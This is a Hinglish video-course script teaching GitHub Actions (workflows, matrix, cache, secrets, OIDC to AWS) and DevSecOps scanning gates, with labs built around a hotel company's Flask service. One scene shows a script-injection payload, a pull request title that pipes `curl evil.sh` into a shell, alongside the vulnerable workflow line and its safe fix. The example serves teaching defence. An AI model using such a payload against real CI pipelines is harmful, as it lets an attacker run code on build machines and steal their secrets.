# ✍️ 02: SCRIPT — SESSION-20: GitHub Actions and DevSecOps
### *DevOps with AI: Build, Ship, Fix — Original Hinglish Script (Faceless Production Edition)*
*Rules: 3s visual hook + promise + course story (Atithi Hotels) + hands-on lab in every episode + binge bridge. Topic map: `SYLLABUS_BLUEPRINT.md` (original wording). Story words: `ANALOGY_STORY.md`.*

## 🎯 Production Metadata
- **Script ID:** `DEVOPS-S20`
- **Focus:** GitHub Actions (workflow, events, jobs, steps, hosted and self-hosted runners), matrix, cache, concurrency, artifacts, `needs` and `if`, secrets, token permissions, environments with approval, script injection, OIDC to AWS, a leaked-secret response, DevSecOps layers (secrets scan, SAST, dependency scan, image scan, IaC scan), pre-commit as the first gate, gates and triage
- **Builds on:** Session 07 (pytest), Session 09 (roles, trust policy, STS, leak response), Session 16 and 16B (hooks, branch protection, pull requests), Session 17 to 19 (Jenkins: conveyor, key cabinet, workbench)
- **Story position:** Zoom level 3, head office. Conveyor ab vault ke andar hi bani hai, bina alag foreman ke. Aur inspection conveyor ka hissa ban jaati hai: ek blueprint inspector aur ek X-ray finished truck designs ke liye, taaki kharab design depot tak pahunche hi nahi.
- **Story words used:** vault (GitHub), conveyor (workflow), station (job and step), workbench (runner), key cabinet (secrets), duty badge (role), blueprint inspector (SAST, SonarQube), X-ray (Trivy), truck design (image), depot (registry), master par taala (branch protection), foreman (Jenkins), staff (admin), guest (end user)
- **Lab project:** Atithi's `rooms-service`, a small Python (Flask) service: tests on every push, a matrix, a cache, an approval for production, and a security job that fails on a known-vulnerable package.
- **Cost rule:** GitHub-hosted runner minutes and Actions storage have plan limits that change. Check the live billing page. A self-hosted runner on an AWS building is billed while it runs. Delete test secrets and roles at the end of the lab.
- **Episodes:**
  - Episode 1: Vault ke Andar ki Conveyor: Workflow, Event, Job
  - Episode 2: Tez aur Samajhdar: Matrix, Cache, Artifact
  - Episode 3: Key Cabinet aur Bina Chaabi ka Deploy: Secrets aur OIDC
  - Episode 4: Conveyor mein Inspection: DevSecOps

---

# 📺 EPISODE 1: Vault ke Andar ki Conveyor

### [00:00 – 02:05] Scene 1: Foreman ke Bina Conveyor
**[VISUAL: A vault (GitHub repo) with a file `.github/workflows/ci.yml`. A push lights a green check on the commit page. No foreman's office, no server anywhere in the picture.]**

**(Voiceover):**
Jenkins mein humne ek foreman hire kiya, uska daftar chalaya, uske plugins, backup aur workbenches sambhaale. GitHub Actions mein conveyor seedha vault ke andar hi hai. Ek YAML file `.github/workflows/` folder mein, aur GitHub aapke liye workbenches chalata hai. Foreman ka daftar aapko nahi sambhalna padta. Chhote aur medium projects ke liye ye bahut sahulat wala hai. Aur ek baar concept samajh gaye, to har CI tool aasaan lagta hai, kyunki Session 17 ke stations aur Jenkinsfile ka dhancha yahin dobara dikhega, bas alag shabdon mein.

### [02:05 – 04:40] Scene 2: Workflow ke Hisse
**[VISUAL: A YAML file with colour-coded sections: `name`, `on` (events), `jobs` → `test` → `runs-on`, `steps`. A diagram: event → workflow → jobs (side by side) → steps (in order). A table comparing Jenkins words to Actions words: Jenkinsfile → workflow, stage → job, step → step, agent → runner.]**

**(Voiceover):**
Workflow ek YAML file hai. `on` batata hai kaun si ghatna conveyor chalayegi: `push`, `pull_request`, `workflow_dispatch` jo button se chalta hai, ya `schedule` jo cron ki tarah chalta hai, aur UTC mein. `jobs` mein kaam hote hain, aur ye default mein ek saath chalte hain. Har job ke paas `runs-on` hota hai, yaani kaun si workbench, jaise `ubuntu-latest`, ek bilkul saaf machine jo job ke baad gayab ho jaati hai. Job ke andar `steps` ek ke baad ek: ya `run` se shell command, ya `uses` se koi taiyaar action, jaise `actions/checkout`. Jenkins se tulna: Jenkinsfile ki jagah workflow, stage ki jagah job, aur agent ki jagah runner.

### [04:40 – 07:10] Scene 3: Pehla Workflow
**[VISUAL: A `ci.yml` for the Flask service: checkout, setup-python, install, pytest. The Actions tab shows a green run with per-step logs and timings.]**

**(Voiceover):**
Ek chhoti Python service ki CI:
```yaml
name: ci
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.12' }
      - run: pip install -r requirements.txt
      - run: pytest -q
```
Push karte hi Actions tab mein run dikhta hai, har step ke log ke saath. Test fail ho to pull request par laal cross aata hai, aur wahi Session 19 jaisa required check ban sakta hai. Ek aur cheez: step ka exit code non-zero ho to job fail. Ye wahi Session 6 ka sabak hai, jo har CI tool ke neeche chalta hai.

### [07:10 – 09:40] Scene 4: Workbench: Hosted aur Self-hosted
**[VISUAL: Two runner types. Left: GitHub-hosted, a fresh virtual machine per job with a small meter of minutes. Right: self-hosted, your own building in a private wing, with a connection arrow going out to GitHub. A warning on the right: "never on a public repo".]**

**(Voiceover):**
Workbench do tarah ki hoti hain. GitHub-hosted: har job ke liye ek naya saaf machine, jise GitHub chalata hai, aur uske minutes ka hisaab plan ke saath badalta hai, isliye live billing page dekho. Self-hosted: aapki apni building, jaise Session 19 ki private wing wali workbench, jo GitHub se bahar ki taraf jud jaati hai. Ye tab kaam aati hai jab job ko aapke private network tak pahunchna ho, ya khaas hardware chahiye. Par ek chetavni: self-hosted runner ko public repo par kabhi mat chalao. Koi bhi pull request ka code us workbench par chal sakta hai, aur wahan aapke network ki chaabiyan hain.

### [09:40 – 12:15] Scene 5: Action ko Pin Karo
**[VISUAL: Three ways to reference an action. `actions/checkout@v4` (a moving tag), `some-org/tool@main` (a branch, red), `some-org/tool@3f2a...` (a full commit SHA, green). A Dependabot pull request that updates the SHA with a comment of the version.]**

**(Voiceover):**
`uses:` mein aap kisi aur ka code apni conveyor mein bula rahe ho. Isliye usse bharose se bulao. Branch ka naam, jaise `@main`, kabhi nahi: wo kal kuch bhi ho sakta hai. Tag, jaise `@v4`, theek hai bharose ke publishers ke liye. Sabse surakshit: poora commit SHA, jaise `@3f2a...`, jo badal nahi sakta. Tab updates ko haath se mat dhoondho: Dependabot actions ke updates ke pull request khud bana deta hai, jisme SHA aur version dono likhe hote hain. Session 16B ka chief architect un pull requests ko review karke merge karta hai. Aur ek aur niyam: third-party action jo aapke secrets dekhti ho, use pehle padh lo.

### [12:15 – 14:55] Scene 6: Lab: Apni Conveyor Banao
**[VISUAL: A small Flask repo with `app.py`, `test_app.py` and `requirements.txt`. Add the workflow file, push, green check. Break a test, push, red check on the pull request. Branch protection requires the check.]**

**(Voiceover):**
Lab. Ek chhota repo banao jisme `app.py` mein ek function ho, jaise `nights(check_in, check_out)`, aur `test_app.py` mein `pytest` ke do tests. `.github/workflows/ci.yml` mein upar wala workflow rakho, aur push karo. Actions tab mein run kholo aur har step ka log dekho. Ab ek test jaan boojh kar tod do, ek branch par, aur pull request kholo. Check laal hoga. Phir branch protection mein ye check required karo, jaise Session 19 mein Jenkins ka check tha, aur dekho ki merge ka button grey ho jaata hai. Test theek karo aur check hara. Ab aapki conveyor vault ke andar hi rehti hai, aur uske badlaav bhi pull request se hote hain.

### [14:55 – 15:25] Scene 7: Recap aur Bridge
**[VISUAL: A card: "workflow = Jenkinsfile · on = event · jobs side by side · steps in order · hosted runner vs self-hosted · pin actions · required check".]**

**(Voiceover):**
Recap: workflow, job aur step, runner ke do tareeke, aur action ko pin karna. Ab conveyor ko tez aur samajhdar banate hain.

---

# 📺 EPISODE 2: Tez aur Samajhdar

### [00:00 – 01:45] Scene 1: 12 Minute ki Conveyor, Roz 40 Baar
**[VISUAL: A run bar: "12 min", with a repeating "pip install" segment of 4 minutes. A cache hit cuts it to 8 minutes. A team waiting at a screen.]**

**(Voiceover):**
Agar Atithi ki conveyor 12 minute leti hai aur din mein chaalis baar chalti hai, to team ka bahut samay kaam karne ki jagah intezaar mein jaata hai. Aur designer us beech doosra kaam shuru kar deta hai, jo context badalne ka mehnga kaam hai. Teen cheezein conveyor ko tez karti hain: cache, matrix aur concurrency. Aur ek aur jo kaam ko saaf rakhta hai: artifacts. Aaj ye sab.

### [01:45 – 04:00] Scene 2: Cache: Kal ki Mehnat Aaj Kaam Aaye
**[VISUAL: A cache step keyed by the hash of `requirements.txt`. First run: "cache miss", save. Second run: "cache restored". A caution tag: "key changes when the file changes".]**

**(Voiceover):**
Cache mein dependencies ko ek baar download karke save kar lete hain, aur agli run mein wahi se utha lete hain. Key ek hash hoti hai, jaise `requirements.txt` ki, `hashFiles('requirements.txt')`. Jab tak file nahi badli, key wahi, aur cache wapas mil jaata hai. File badli to nayi key aur naya download. Aasaan tareeka: `actions/setup-python` mein `cache: pip` likh do, to ye sab apne aap hota hai. Ek chetavni: cache sirf speed ke liye hai, sachchai ke liye nahi. Conveyor cache ke bina bhi chalni chahiye, bas dheemi.

### [04:00 – 06:30] Scene 3: Matrix: Ek Job, Kai Combination
**[VISUAL: `strategy.matrix` with `python: ['3.11','3.12','3.13']` and `os: [ubuntu-latest, windows-latest]` expanding into six small job boxes. A `fail-fast` switch, and `include` and `exclude` examples.]**

**(Voiceover):**
Matrix ek job ko kai combinations par chalata hai. Do operating systems aur teen Python versions, to chhe jobs ek saath. Isse compatibility ek saath pakdi jaati hai: Atithi ki service server par 3.12 par chalegi, par designer ke laptop par 3.11 ho sakta hai. `fail-fast` ka matlab ek job fail hone par baaki rok do. `include` aur `exclude` se kuch combination jodna ya hatana hota hai. Ek ghar ki baat: chhe jobs ka matlab chhe guna minutes ka hisaab, isliye matrix wahi rakho jo sach mein chahiye. Session 18 ke parallel stations ka yahi bada roop hai.

### [06:30 – 09:10] Scene 4: Concurrency aur Artifacts
**[VISUAL: Two quick pushes to the same branch; the first run is cancelled by `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }`. Then a `build` job uploading `dist/` and a `deploy` job with `needs: build` downloading it, and `if: github.ref == 'refs/heads/main'`.]**

**(Voiceover):**
Do baar jaldi jaldi push karne par pehli run bekaar hai. `concurrency` ke group aur `cancel-in-progress: true` se purani run apne aap cancel ho jaati hai. Ye Jenkins ke `disableConcurrentBuilds` ka dusra roop hai. Ek job ka natija doosre job ko dena ho, to artifacts: `upload-artifact` se `build` job ka finished unit save karo, aur `needs: build` ke saath `deploy` job mein `download-artifact`. `if: github.ref == 'refs/heads/main'` se deploy sirf master par. Version 4 ke artifacts ke naam har run mein alag hone chahiye, isliye matrix mein naam mein combination jodo. Aur artifacts ki ek meyaad hoti hai, jisse storage ka kharcha bachta hai.

### [09:10 – 11:30] Scene 5: Reusable Workflow: Binder ka Doosra Roop
**[VISUAL: A shared repo `atithi-workflows` with `.github/workflows/python-ci.yml` declared `on: workflow_call` with inputs. Ten services each calling it in four lines: `uses: atithi/atithi-workflows/.github/workflows/python-ci.yml@v1`.]**

**(Voiceover):**
Session 18 mein humne dus services ke liye ek shared instruction binder dekha tha. Actions mein iska roop reusable workflow hai. Ek shared repo mein ek workflow `on: workflow_call` ke saath likhte ho, jo inputs leta hai, jaise Python version. Aur har service ki conveyor sirf chaar line mein use bulati hai: `uses: atithi/atithi-workflows/.github/workflows/python-ci.yml@v1`. Wahi niyam: version tag lagao, `@v1`, taaki ek badlaav sab ko ek saath na tode, aur use bhi pull request se review karo. Is tarah nayi service ki conveyor chhoti rehti hai aur standard sab jagah ek jaisa.

### [11:30 – 14:10] Scene 6: Raat ki Conveyor aur Haath ka Button
**[VISUAL: A workflow with `on: schedule: - cron: '30 20 * * *'` and `workflow_dispatch` with an input `environment`. A calendar showing the run at 02:00 India time. A "Run workflow" button in the Actions tab with a dropdown.]**

**(Voiceover):**
Conveyor sirf push par nahi chalti. `schedule` ke saath `cron: '30 20 * * *'` roz ek tay samay par chalti hai, jaise raat ka dependency scan, kyunki kal tak jo package theek tha, aaj uski nayi kamzori mil sakti hai. Dhyaan: ye cron UTC mein hai, to `20:30` UTC bharat mein raat ke do bajte hain. Aur `workflow_dispatch` ek button hai: Actions tab mein "Run workflow" dabao, aur inputs chuno, jaise `environment`. Isse haath se deploy ya re-run bina nayi commit ke. Ek niyam: scheduled aur manual run bhi usi branch ke workflow se chalte hain, aur schedule sirf default branch par chalta hai.

### [14:10 – 16:10] Scene 7: Lab: Matrix, Cache aur Artifact
**[VISUAL: The previous workflow upgraded: matrix Python 3.11 and 3.12, `cache: pip`, a step `pytest --junitxml=report.xml`, and `upload-artifact` with `name: report-${{ matrix.python }}`. The run page shows two parallel jobs and "Cache restored" on the second run.]**

**(Voiceover):**
Lab. Pichhli workflow mein `strategy: matrix: python: ['3.11','3.12']` jodo, aur `python-version: ${{ matrix.python }}`. `setup-python` mein `cache: pip` likho. Ek step mein `pytest --junitxml=report.xml`, aur `upload-artifact` mein `name: report-${{ matrix.python }}`. Ab `concurrency` ka block bhi jodo. Do baar push karo. Doosri baar log mein "Cache restored" dikhega aur run tez hogi. Ek aur test: jaldi jaldi do push karo aur dekho ki pehli run cancel ho gayi. Aakhir mein run page se artifacts download karke dekho.

### [16:10 – 16:45] Scene 8: Recap aur Bridge
**[VISUAL: A card: "cache keyed by lockfile · matrix = many combos · concurrency cancels old runs · artifacts + needs + if · reusable workflow = shared binder".]**

**(Voiceover):**
Recap: cache, matrix, concurrency, artifacts aur reusable workflow. Ab deploy ke liye key cabinet, aur ek tareeka bina chaabi ke andar jaane ka.

---

# 📺 EPISODE 3: Key Cabinet aur Bina Chaabi ka Deploy

### [00:00 – 02:05] Scene 1: Secrets ka Khatra
**[VISUAL: A repo secret `AWS_SECRET_ACCESS_KEY` stored in the vault. A pull request from an outside contractor tries to print it. A shield stops it. A "long-lived key" tag glows as a liability.]**

**(Voiceover):**
AWS ki chaabi ko vault ke secrets mein rakhna sahi shuruaat hai, par wo ek lambi chaabi hai. Jab tak koi badle nahi, wo chalti rehti hai, aur leak ho sakti hai. Session 9 ke access keys ka wahi sabak: jitni lambi chaabi, utna bada khatra. Aur Session 19 ki baat yahan bhi sach hai: jo secret hai hi nahi, wo leak nahi ho sakta. Isliye pehle dekhte hain ki secrets ko sahi tareeke se kaise rakhte hain, aur phir ek aisa tareeka jisme chaabi hai hi nahi: OIDC.

### [02:05 – 04:45] Scene 2: Secrets, Environments aur Token ki Ijaazat
**[VISUAL: Settings → Secrets and variables → Actions: repository secrets, environment secrets, variables. Usage `${{ secrets.NAME }}`. An environment `production` with required reviewers. A workflow header `permissions: { contents: read }`.]**

**(Voiceover):**
Secrets repository ya environment level par rakhte hain, aur workflow mein `${{ secrets.NAME }}` se use karte hain. Log mein GitHub unhe mask karta hai, par Session 19 ki baat yaad rakho: masking ek parda hai, taala nahi. Fork se aane wale pull requests ko secrets nahi milte, jo achha safety feature hai. `production` jaise environment mein required reviewers lag sakte hain, jisse deploy tabhi chalta hai jab koi insaan haan kahe, aur environment ke secrets sirf us job ko milte hain. Ye suvidha plan par nirbhar hai, isliye dekh lo. Aur workflow ke token ki ijaazat `permissions:` block se kam rakho, jaise `contents: read`, taaki bhool se bhi wo zyada na kar sake.

### [04:45 – 07:25] Scene 3: Script Injection: Title Mein Command
**[VISUAL: A pull request title: `fix"; curl evil.sh | sh; "`. A workflow step `run: echo "${{ github.event.pull_request.title }}"`, with the title expanded into the shell and executed. The safe version: `env: TITLE: ${{ github.event.pull_request.title }}` and `run: echo "$TITLE"`.]**

**(Voiceover):**
Ek bahut aam galti. Workflow mein `run: echo "${{ github.event.pull_request.title }}"` likha hai. `${{ }}` ke andar ki cheez shell chalne se pehle text mein bhar di jaati hai. Agar koi pull request ka title likhe `fix"; curl evil.sh | sh; "`, to wo title command ban jaata hai aur aapki workbench par chal jaata hai. Ye script injection hai, aur Session 17 ke double quotes ke jaal ka bada bhai. Hal: bahar ke text ko pehle `env:` mein daalo, aur shell mein `"$TITLE"` ki tarah use karo, jahan shell use sirf data maanta hai. Aur `pull_request_target` jaise events se bacho, kyunki wo base repo ke secrets ke saath bahar ka code chala sakte hain.

### [07:25 – 09:55] Scene 4: OIDC: Duty Badge Bina Chaabi ke
**[VISUAL: A sequence. 1: the workflow asks the vault for an identity token. 2: it presents the token to AWS STS. 3: STS checks the role's trust policy (repo and branch or environment). 4: STS returns short-lived credentials. A YAML snippet: `permissions: { id-token: write, contents: read }` and `aws-actions/configure-aws-credentials@v4` with `role-to-assume` and `aws-region`.]**

**(Voiceover):**
OIDC mein workbench vault se ek chhota identity token maangti hai, use AWS ke saamne rakhti hai, aur AWS dekhta hai ki role ki trust policy ke hisaab se ye repo aur branch ya environment allowed hai ya nahi. Allowed ho to chhota, kuch minute ka credential milta hai, jaise Session 9 ke assume-role mein tha. Koi chaabi vault mein hai hi nahi. Workflow mein `permissions: id-token: write` aur `aws-actions/configure-aws-credentials` ke saath `role-to-assume`. AWS mein ek identity provider `token.actions.githubusercontent.com` banta hai, aur role ki trust policy mein `sub` ki shart likhte hain, jaise `repo:atithi/rooms-service:ref:refs/heads/main`. Ye shart zaroori hai: bina iske koi bhi repo wo role le sakta hai.

### [09:55 – 12:45] Scene 5: Secret Leak Ho Gaya: Pehle Kya
**[VISUAL: A commit with a real key. A timeline: 1 Revoke the key right now. 2 Check the logs for use. 3 Remove it from history. 4 Add a guard so it cannot repeat. A line: "History cleaning comes last, not first".]**

**(Voiceover):**
Kisi ne galti se key commit kar di. Session 9 ka kram yahan bhi wahi: pehle chaabi band karo, history baad mein. Ek, us chaabi ko turant revoke ya deactivate karo, kyunki jab tak wo push hui, usse ek bot padh chuka ho sakta hai. Do, logs se dekho ki us chaabi se kuch hua ya nahi. Teen, tab history se hatao, `git filter-repo` ya BFG jaise tool se, aur team ko bolo ki sab dobara clone karein. Chaar, aage ke liye pehra: vault ka secret scanning aur push protection, aur ek pre-commit hook jo commit se pehle hi key pakad le. Seedha sabak: history saaf karne se key wapas safe nahi hoti. Safe tab hoti hai jab wo band ho.

### [12:45 – 15:10] Scene 6: Lab: Secret, Environment aur Approval
**[VISUAL: A secret `DEMO_TOKEN`. A workflow step with `env: DEMO_TOKEN: ${{ secrets.DEMO_TOKEN }}` and `run: echo "length=${#DEMO_TOKEN}"`. An environment `production` with a required reviewer; the `deploy` job waits for a button. A second job showing the injection-safe pattern.]**

**(Voiceover):**
Lab. Repo mein ek secret `DEMO_TOKEN` banao. Workflow mein `env: DEMO_TOKEN: ${{ secrets.DEMO_TOKEN }}` aur `run: echo "length=${#DEMO_TOKEN}"`. Phir ek environment `production` banao aur khud ko required reviewer rakho. `deploy` job mein `environment: production` likho. Run karo: job approval par rukega, aur haan dene ke baad hi chalega. Ek aur step jodo jo pull request ka title `env:` ke raaste padhe, aur `"$TITLE"` ki tarah echo kare. Agar aapke paas AWS account hai, to ek OIDC provider aur ek role banao jiski trust policy mein sirf aapka repo ho, aur `aws sts get-caller-identity` chala kar dekho. Lab ke baad role aur provider hata do.

### [15:10 – 15:40] Scene 7: Recap aur Bridge
**[VISUAL: A card: "secrets scoped · permissions least · environment approval · never put ${{ }} text into run · OIDC > static keys with a trust policy · leak: revoke first".]**

**(Voiceover):**
Recap: secrets, token ki ijaazat, script injection aur OIDC. Ab conveyor mein inspection: DevSecOps.

---

# 📺 EPISODE 4: Conveyor mein Inspection

### [00:00 – 01:55] Scene 1: Security Aakhir mein Kyun?
**[VISUAL: A timeline: code → fabricate → inspect → deliver → live. At the far end a security reviewer holds a "stop" sign and releases slip by weeks. The next frame: small inspection gates placed along the whole timeline.]**

**(Voiceover):**
Purane tareeke mein security team release ke bilkul aakhir mein aati thi. Ek bada issue mila to hafton ki deri, aur sab ek doosre se naraaz. DevSecOps ka matlab hai ki security conveyor ke har station par chhote automatic jaanch ban kar rahe, shuru se. Isse "shift left" kehte hain: problem jitni jaldi pakdi, utni sasti. Aur ek aur faayda: developer ko jawab turant milta hai, usi pull request mein, jab wo kaam abhi uske dimaag mein hai.

### [01:55 – 04:30] Scene 2: Inspection ki Parten
**[VISUAL: A conveyor with five inspection points. 1 Secrets scan (Gitleaks). 2 Blueprint inspector for our own code (CodeQL, SonarQube). 3 Dependency check (pip-audit, Dependabot). 4 X-ray for the finished truck design (Trivy). 5 Infrastructure plan scan (Checkov, tfsec). Each with a one-line "catches".]**

**(Voiceover):**
Paanch parten yaad rakho. Ek: secrets scan, jaise Gitleaks, jo dekhta hai ki kisi ne key ya token commit to nahi kiya. Do: blueprint inspector, yaani SAST, jaise CodeQL ya SonarQube, jo hamare apne code mein galat pattern dhoondhta hai, jaise SQL injection. Teen: dependency scan, yaani SCA, jaise pip-audit aur Dependabot, jo bahar ke packages ki known kamzoriyan dhoondhta hai. Chaar: X-ray, yaani Trivy, jo finished truck design, yaani Docker image, ke andar ke packages jaanchta hai. Paanch: infrastructure code ka scan, jaise Terraform ke liye Checkov, jo hum aage dekhenge. Har tool alag cheez pakadta hai, aur koi ek tool sab kuch nahi karta.

### [04:30 – 06:50] Scene 3: Pehla Gate: Commit se Pehle
**[VISUAL: A designer's laptop. `git commit` runs a `pre-commit` hook that calls `gitleaks protect --staged` and refuses the commit with a message showing the line and file. A line "the hook is the first gate; the conveyor is the second".]**

**(Voiceover):**
Sabse sasta gate commit se pehle hai. Session 16 ka pre-commit hook yaad hai? Ek hook jo staged files par secrets scan chalaye, jaise `gitleaks protect --staged`, aur secret mile to commit hone hi na de. Ye pehla gate hai, kyunki key commit hone se pehle hi rok li jaati hai, aur history mein kabhi jaati hi nahi. Par hook designer ki apni laptop par hai aur use skip kiya ja sakta hai, `--no-verify` se. Isliye conveyor dusra gate hai, jise koi skip nahi kar sakta. Dono chahiye: ek jaldi ke liye, ek bharose ke liye.

### [06:50 – 09:40] Scene 4: Gate Sochkar Lagao: Shor Nahi, Signal
**[VISUAL: A scan report sorted by severity (CRITICAL, HIGH, MEDIUM, LOW). A policy card: "fail on CRITICAL and HIGH that have a fix; report the rest". A triage board: Fix now, Accept risk (with reason and expiry), False positive. A `.trivyignore` file with a comment line and an expiry date.]**

**(Voiceover):**
Har finding par build fail karoge, to conveyor roz toot jayegi, aur team use ignore karna seekh legi. Wahi shor wali baat jo Session 15 ke alarm mein thi. Isliye gate sochkar lagao. CRITICAL aur HIGH, jinka fix available hai, un par build fail. Baaki ko report karo aur plan karo. Kuch findings false positive hongi, aur kuch par risk accept karna padega, par uska karan aur samay-seema likhni chahiye, jaise `.trivyignore` mein comment ke saath. Aur ek aur niyam: security job ko required check banao, warna wo sirf suggestion rehta hai. Aur dependencies ke updates Dependabot khud pull request mein bhej deta hai, to naye version tak pahunchna roz ka chhota kaam rahe, saal ka bada nahi.

### [09:40 – 12:25] Scene 5: Lab: Security Job
**[VISUAL: A workflow with a `security` job: Gitleaks action, `pip install pip-audit && pip-audit -r requirements.txt`, and `trivy fs --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 .`. A deliberately old vulnerable package pin fails the job. After the upgrade, the job passes and the pull request check turns green.]**

**(Voiceover):**
Lab. Workflow mein ek `security` job jodo. Secrets scan ke liye Gitleaks ka official action. Dependencies ke liye `pip install pip-audit && pip-audit -r requirements.txt`. Aur Trivy ka filesystem scan: `trivy fs --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 .`. Ab `requirements.txt` mein jaan boojh kar ek purana, jaana-maana vulnerable package version rakho, aur dekho ki job fail hoti hai. Report padho: package, kamzori ka ID, aur kis version mein fix hai. Version upgrade karo aur job pass karao. Phir ek pre-commit hook lagao jo gitleaks se staged files dekhe, aur ek nakli key likh kar commit karne ki koshish karo: hook use rok dega. Naye tool versions ke liye unki official docs dekhna.

### [12:25 – 14:20] Scene 6: Recap aur Bridge
**[VISUAL: A card: "shift left · secrets / SAST / dependency / image / IaC · hook first, conveyor second · fail on fixable HIGH+ · triage with reasons · required check". Then an empty truck-shaped outline appears in the courtyard of a building.]**

**(Voiceover):**
Recap: Git, Jenkins, GitHub Actions aur security gates. Conveyor ab inspection ke saath chalti hai. Par abhi tak conveyor jo finished unit banati hai, wo ek jar ya zip file hai, jise chalane ke liye har server par sahi Java ya Python version chahiye. Ab hum use ek sealed truck mein pack karenge, jo har building ke courtyard mein ek jaisa chalega, aur "mere laptop par to chal raha tha" wali baat hamesha ke liye khatam. Agla session: Docker.

---

# 📎 Student handout: Session 20 cheat sheet
*Not spoken. Shown on screen at the end, or given as a download.*

| Cheez | Yaad rakho |
|---|---|
| Workflow | `.github/workflows/*.yml`; `on`, `jobs`, `runs-on`, `steps` |
| Jenkins se tulna | Jenkinsfile → workflow, stage → job, agent → runner |
| Events | `push`, `pull_request`, `workflow_dispatch`, `schedule` (UTC) |
| Runner | Hosted (naya machine, minutes ka hisaab) vs self-hosted (public repo par nahi) |
| Pin | Branch nahi; tag theek; SHA sabse surakshit; Dependabot se update |
| Cache | Key = lockfile ka hash; cache sirf speed ke liye |
| Matrix | Combinations; `fail-fast`; `include` / `exclude`; minutes guna ho jaate hain |
| Concurrency | `cancel-in-progress: true` purani run ko roke |
| Artifacts | `upload` / `download`; `needs`; `if`; naam har run mein alag |
| Reusable workflow | `workflow_call`; version tag `@v1` |
| Secrets | Scope chhota; fork ko nahi milte; masking parda hai |
| Permissions | `permissions:` kam se kam; environment approval |
| Script injection | `${{ }}` ko `run` mein mat daalo; `env:` se do |
| OIDC | `id-token: write`; trust policy mein repo + branch ya environment |
| Leak | Pehle revoke, phir logs, phir history, phir pehra |
| DevSecOps parten | Secrets, SAST, dependency, image, IaC |
| Gate | Hook pehla, conveyor doosra; fixable HIGH+ par fail; triage reason + expiry |
| Safai | Test secrets, role, OIDC provider, extra workbenches |
